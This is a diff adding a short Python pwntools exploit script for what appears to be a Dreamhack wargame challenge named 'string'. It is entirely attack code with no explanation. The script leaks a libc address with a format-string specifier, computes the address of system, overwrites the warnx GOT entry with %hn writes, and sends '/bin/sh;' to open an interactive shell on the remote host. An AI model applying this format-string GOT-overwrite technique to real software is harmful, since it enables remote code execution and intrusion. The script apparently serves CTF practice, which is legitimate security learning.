@@ -1,0 +1,85 @@
+from pwn import *
+
+
+r = remote("host1.dreamhack.games", 22694)
+# r = process("./string")
+
+libc = ELF('./libc.so.6')
+e = ELF('./libc-2.27.so')
+
+printf_got = 0x804a014 
+warnx_got = 0x804a02c
+
+# input
+r.sendline('1')
+sleep(1)
+
+# libc leak 
+payload  = b""
+payload += b"%71$p"
+
+r.sendline(payload)
+
+sleep(1)
+
+
+r.sendline('2')
+sleep(1)
+
+
+r.recvuntil("string: ")
+
+temp = r.recvuntil("\n")
+libc_base = int(temp.decode()[2:-1], 16)
+libc_system = libc_base + libc.symbols['system'] - libc.sym['__libc_start_main'] - 247
+# libc_system = libc_base + 0xf7db4e10 - 0xf7d90f21
+# print(libc.symbols['__libc_start_main'])
+# print(hex(libc_base))
+# print(hex(libc_system))
+
+r.recvuntil("> ")
+r.sendline('1')
+sleep(1)
+
+# fsb로 warnx를 got_overwrite
+
+payload  = b""
+payload += p32(warnx_got)
+payload += p32(warnx_got + 2)
+payload += b"%%%d"%((libc_system & 0xffff)- 8)
+payload += b"c%5$hn"
+payload += b"%%%d"%((libc_system >> 16) - (libc_system & 0xffff))
+payload += b"c%6$hn"
+
+r.sendline(payload)
+sleep(2)
+
+
+r.recvuntil("> ")
+r.sendline('2')
+
+
+sleep(1)
+
+
+
+
+r.recvuntil("> ")
+r.sendline('1')
+sleep(1)
+
+payload  = b""
+payload += b"/bin/sh;" 
+
+r.sendline(payload)
+sleep(1)
+
+r.recvuntil("> ")
+r.sendline("2")
+
+
+
+
+r.interactive()
+
+
